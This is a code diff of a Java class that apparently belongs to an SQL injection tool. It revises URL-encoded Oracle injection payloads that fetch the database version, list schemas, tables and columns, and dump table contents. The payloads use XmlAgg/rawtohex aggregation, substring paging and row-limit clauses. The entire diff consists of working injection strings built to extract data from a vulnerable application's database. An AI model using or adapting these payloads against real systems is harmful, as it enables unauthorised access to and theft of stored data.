@@ -14,70 +14,174 @@ public class OracleStrategy implements ISQLStrategy {
 
     @Override
     public String getSchemaInfos() {
-        return "SELECT+rawtohex(version||'{%}'||SYS.DATABASE_NAME||'{%}'||user||'{%}'||user)||'i'FROM+v%24instance";
+//        return "SELECT+rawtohex(version||'{%}'||SYS.DATABASE_NAME||'{%}'||user||'{%}'||user)||'i'FROM+v%24instance";
+        return "SELECT+version||'{%}'||SYS.DATABASE_NAME||'{%}'||user||'{%}'||user||'%01%03%03%07'FROM+v%24instance";
+//        return "SELECT+'%04'||version||'{%}'||SYS.DATABASE_NAME||'{%}'||user||'{%}'||user||'%050%04'||"
+//        + "'%01%03%03%07'"
+//        + "FROM+v%24instance";
     }
 
     @Override
     public String getSchemaList() {
         return
             "select+" +
-                "replace(" +
+                "utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(replace(" +
                     "replace(" +
                         "XmlAgg(" +
-                            "XmlElement(\"a\",'hh'||rawtohex(owner)||'jj'||'30'||'hh')order+by+owner+nulls+last" +
+                            "XmlElement(\"a\",rawtohex('%04'||s||'%050%04'))order+by+s+nulls+last" +
                         ").getClobVal()," +
                     "'<a>','')," +
-                "'<%2Fa>','gg')" +
-                "||'i'" +
-            "from(SELECT+distinct+owner+FROM+all_tables+where+1=1+{limit})";
+                "'<%2Fa>',rawtohex('%06'))||rawtohex('%01%03%03%07'),4000,1)AS+VARCHAR(1024)))" +
+                "" +
+//            "from(SELECT+distinct+owner+FROM+all_tables+where+1=1+{limit})";
+                "+from(select+t.s+from(SELECT+DISTINCT+owner+s+"+
+                "FROM+all_tables+"+
+                ")t,(SELECT+DISTINCT+owner+s+"+
+                "FROM+all_tables+"+
+                ")t1+"+
+                "where+t.s>=t1.s+"+
+                "group+by+t.s+"+
+                "{limit})+";
+        
+        
+        
+//                "select+x+from(select+x,rownum+from(" +
+//            "select+x||'%01%03%03%07'||case+when+r>=nb+then+'%01%03%03%07'end+x+from(select+a.x,rownum+r+from("
+//            + "SELECT+distinct'%04'||owner||'%050%04'x,owner+FROM+all_tables+group+by+owner+order+by+owner"
+//            + ")a),(select+count(distinct+owner)nb+FROM+all_tables)where+1=1+{limit}+union+select+'%01%03%03%07'from+dual+order+by+1+desc" +
+//            ")where+rownum=1)";
+//        return
+//                "select+" +
+//                    "replace(" +
+//                        "replace(" +
+//                            "XmlAgg(" +
+//                                "XmlElement(\"a\",'hh'||rawtohex(owner)||'jj'||'30'||'hh')order+by+owner+nulls+last" +
+//                            ").getClobVal()," +
+//                        "'<a>','')," +
+//                    "'<%2Fa>','gg')" +
+//                    "||'i'" +
+//                "from(SELECT+distinct+owner+FROM+all_tables+where+1=1+{limit})";
     }
 
     @Override
     public String getTableList(Database database) {
         return
-            "select+" +
-                "replace(" +
+//            "select+" +
+//                "replace(" +
+//                    "replace(" +
+//                        "XmlAgg(" +
+//                            "XmlElement(\"a\",'hh'||rawtohex(table_name)||'jj'||'30'||'hh')order+by+table_name+nulls+last" +
+//                        ").getClobVal()," +
+//                    "'<a>','')," +
+//                "'<%2Fa>','gg')" +
+//                "||'i'" +
+//            "from(SELECT+distinct+table_name+FROM+all_tables+where+owner='" + database + "'{limit})";
+                "select+" +
+                "utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(replace(" +
                     "replace(" +
                         "XmlAgg(" +
-                            "XmlElement(\"a\",'hh'||rawtohex(table_name)||'jj'||'30'||'hh')order+by+table_name+nulls+last" +
+                            "XmlElement(\"a\",rawtohex('%04'||s||'%050%04'))order+by+s+nulls+last" +
                         ").getClobVal()," +
                     "'<a>','')," +
-                "'<%2Fa>','gg')" +
-                "||'i'" +
-            "from(SELECT+distinct+table_name+FROM+all_tables+where+owner='" + database + "'{limit})";
+                "'<%2Fa>',rawtohex('%06'))||rawtohex('%01%03%03%07'),4000,1)AS+VARCHAR(1024)))" +
+                "" +
+//            "from(SELECT+distinct+owner+FROM+all_tables+where+1=1+{limit})";
+                "+from(select+t.s+from(SELECT+DISTINCT+table_name+s+"+
+                "FROM+all_tables+where+owner='" + database + "'+"+
+                ")t,(SELECT+DISTINCT+table_name+s+"+
+                "FROM+all_tables+where+owner='" + database + "'+"+
+                ")t1+"+
+                "where+t.s>=t1.s+"+
+                "group+by+t.s+"+
+                "{limit})+";
+        
+//        "select+x+from(select+x,rownum+from(" +
+//        "select+x||'%01%03%03%07'||case+when+r>=nb+then+'%01%03%03%07'end+x+from(select+a.x,rownum+r+from("
+//        + "SELECT+distinct'%04'||table_name||'%050%04'x,table_name+FROM+all_tables+where+owner='" + database + "'+group+by+table_name+order+by+table_name"
+//        + ")a),(select+count(distinct+table_name)nb+FROM+all_tables+where+owner='" + database + "')where+1=1+{limit}+union+select+'%01%03%03%07'from+dual+order+by+1+desc" +
+//        ")where+rownum=1)";
     }
 
     @Override
     public String getColumnList(Table table) {
         return
-            "select+" +
-                "replace(" +
-                    "replace(" +
-                        "XmlAgg(" +
-                            "XmlElement(\"a\",'hh'||rawtohex(column_name)||'jj'||'30'||'hh')order+by+column_name+nulls+last" +
-                        ").getClobVal()," +
-                    "'<a>','')," +
-                "'<%2Fa>','gg')" +
-                "||'i'" +
-            "from(SELECT+distinct+column_name+FROM+all_tab_columns+where+owner='" + table.getParent() + "'and+table_name='" + table + "'{limit})";
+//            "select+" +
+//                "replace(" +
+//                    "replace(" +
+//                        "XmlAgg(" +
+//                            "XmlElement(\"a\",'hh'||rawtohex(column_name)||'jj'||'30'||'hh')order+by+column_name+nulls+last" +
+//                        ").getClobVal()," +
+//                    "'<a>','')," +
+//                "'<%2Fa>','gg')" +
+//                "||'i'" +
+//            "from(SELECT+distinct+column_name+FROM+all_tab_columns+where+owner='" + table.getParent() + "'and+table_name='" + table + "'{limit})";
+//        "select+x+from(select+x,rownum+from(" +
+//        "select+x||'%01%03%03%07'||case+when+r>=nb+then+'%01%03%03%07'end+x+from(select+a.x,rownum+r+from("
+//        + "SELECT+distinct'%04'||column_name||'%050%04'x,column_name+FROM+all_tab_columns+where+owner='" + table.getParent() + "'and+table_name='" + table + "'+group+by+column_name+order+by+column_name"
+//        + ")a),(select+count(distinct+column_name)nb+FROM+all_tab_columns+where+owner='" + table.getParent() + "'and+table_name='" + table + "')where+1=1+{limit}+union+select+'%01%03%03%07'from+dual+order+by+1+desc" +
+//        ")where+rownum=1)";
+        
+        "select+" +
+        "utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(replace(" +
+            "replace(" +
+                "XmlAgg(" +
+                    "XmlElement(\"a\",rawtohex('%04'||s||'%050%04'))order+by+s+nulls+last" +
+                ").getClobVal()," +
+            "'<a>','')," +
+        "'<%2Fa>',rawtohex('%06'))||rawtohex('%01%03%03%07'),4000,1)AS+VARCHAR(1024)))" +
+        "" +
+//    "from(SELECT+distinct+owner+FROM+all_tables+where+1=1+{limit})";
+        "+from(select+t.s+from(SELECT+DISTINCT+column_name+s+"+
+        "FROM+all_tab_columns+where+owner='" + table.getParent() + "'and+table_name='" + table + "'"+
+        ")t,(SELECT+DISTINCT+column_name+s+"+
+        "FROM+all_tab_columns+where+owner='" + table.getParent() + "'and+table_name='" + table + "'"+
+        ")t1+"+
+        "where+t.s>=t1.s+"+
+        "group+by+t.s+"+
+        "{limit})+";        
+
     }
 
     @Override
     public String getValues(String[] columns, Database database, Table table) {
-        String formatListColumn = ToolsString.join(columns, ")||chr(127)||trim(");
-        formatListColumn = "trim(" + formatListColumn + ")";
+        String formatListColumn = ToolsString.join(columns, "))||chr(127)||trim(to_char(");
+        formatListColumn = "trim(to_char(" + formatListColumn + "))";
         
         return
-            "select+" +
-                "replace(" +
-                    "replace(" +
-                        "XmlAgg(" +
-                            "XmlElement(\"a\",'hh'||rawtohex(" + formatListColumn + ")||'jj'||'30'||'hh')order+by+" + ToolsString.join(columns, ",") + "+nulls+last" +
-                        ").getClobVal()," +
-                    "'<a>','')," +
-                "'<%2Fa>','gg')" +
-                "||'i'" +
-            "from(SELECT+distinct+" + ToolsString.join(columns, ",") + "+FROM+" + database + "." + table + "+where+1=1+{limit})";
+//            "select+" +
+//                "replace(" +
+//                    "replace(" +
+//                        "XmlAgg(" +
+//                            "XmlElement(\"a\",'hh'||rawtohex(" + formatListColumn + ")||'jj'||'30'||'hh')order+by+" + ToolsString.join(columns, ",") + "+nulls+last" +
+//                        ").getClobVal()," +
+//                    "'<a>','')," +
+//                "'<%2Fa>','gg')" +
+//                "||'i'" +
+//            "from(SELECT+distinct+" + ToolsString.join(columns, ",") + "+FROM+" + database + "." + table + "+where+1=1+{limit})";
+//        "select+x+from(select+x,rownum+from(" +
+//        "select+x||'%01%03%03%07'||case+when+r>=nb+then+'%01%03%03%07'end+x+from(select+a.x,rownum+r+from("
+//        + "SELECT+distinct'%04'||" + formatListColumn + "||'%050%04'x," + ToolsString.join(columns, ",") + "+FROM+" + database + "." + table + "+group+by+" + ToolsString.join(columns, ",") + "+order+by+" + ToolsString.join(columns, ",") + ""
+//        + ")a),(select+count(distinct+" + formatListColumn + ")nb+FROM+" + database + "." + table + ")where+1=1+{limit}+union+select+'%01%03%03%07'from+dual+order+by+1+desc" +
+//        ")where+rownum=1)";
+
+        "select+" +
+        "utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(replace(" +
+            "replace(" +
+                "XmlAgg(" +
+                    "XmlElement(\"a\",rawtohex('%04'||s||'%050%04'))order+by+s+nulls+last" +
+                ").getClobVal()," +
+            "'<a>','')," +
+        "'<%2Fa>',rawtohex('%06'))||rawtohex('%01%03%03%07'),4000,1)AS+VARCHAR(1024)))" +
+        "" +
+//    "from(SELECT+distinct+owner+FROM+all_tables+where+1=1+{limit})";
+        "+from(select+t.s+from(SELECT+DISTINCT+" + formatListColumn + "+s+"+
+        "FROM+" + database + "." + table + ""+
+        ")t,(SELECT+DISTINCT+" + formatListColumn + "+s+"+
+        "FROM+" + database + "." + table + ""+
+        ")t1+"+
+        "where+t.s>=t1.s+"+
+        "group+by+t.s+"+
+        "{limit})+";        
     }
 
     @Override
@@ -235,11 +339,13 @@ public class OracleStrategy implements ISQLStrategy {
         return 
             "(" +
             "select+*+from(select+" +
-                "replace('SQLi'||substr(" +
+                "'SQLi'||substr(" +
+//                "replace('SQLi'||substr(" +
                     "(" + sqlQuery + ")," +
                     startPosition + "," +
                     "3996" +
-                "),'SQLii','')from+dual)x" +
+                ")from+dual)x" +
+//                "),'SQLi','')from+dual)x" +
             ")";
     }
 
@@ -265,7 +371,28 @@ public class OracleStrategy implements ISQLStrategy {
         return 
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
-                "(select'SQLi'||rpad('#',1024,'#')||'iLQS'from+dual)"
+                /**
+                 * rpad 1024 (not 65536) to avoid error 'result of string concatenation is too long'
+                 */
+//                "(select'SQLi$1'||rpad('%23',1024,'%23')||'iLQS'from+dual)"
+                "(SELECT+TO_CHAR(" +
+                    "(SELECT*" +
+                    "FROM" +
+                      "(SELECT'SQLi$1'" +
+                        "||SUBSTR(" +
+                        "(SELECT+utl_raw.cast_to_varchar2(CAST(DBMS_LOB.SUBSTR(REPLACE(REPLACE(XmlAgg(XmlElement(\"a\",rawtohex(" +
+                          "s" +
+                          "))" +
+                        "ORDER+BY+s+nulls+last).getClobVal(),'<a>',''),'<%2fa>',rawtohex('6'))" +
+                          "||rawtohex('1337'),4000,1)AS+VARCHAR(1024)))" +
+                        "FROM" +
+                          "(SELECT+DISTINCT+rpad('%23',1024,'%23')s+FROM+dual" +
+                          ")" +
+                        "),1,3996)" +
+                      "FROM+dual" +
+                      ")x" +
+                    "))" +
+                  "FROM+dual)"
             );
     }
 
@@ -285,7 +412,10 @@ public class OracleStrategy implements ISQLStrategy {
 
     @Override
     public String getLimit(Integer limitSQLResult) {
-        return "+and+rownum+between+" + limitSQLResult + "+and+65536";
+//        return "+and+rownum+between+" + limitSQLResult + "+and+65536";
+//        return "+and+rownum+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
+//        return "+and+r=" + (limitSQLResult+1);
+        return "+having+count(*)between+" + (limitSQLResult+1) + "+and+65536";
     }
 
 }
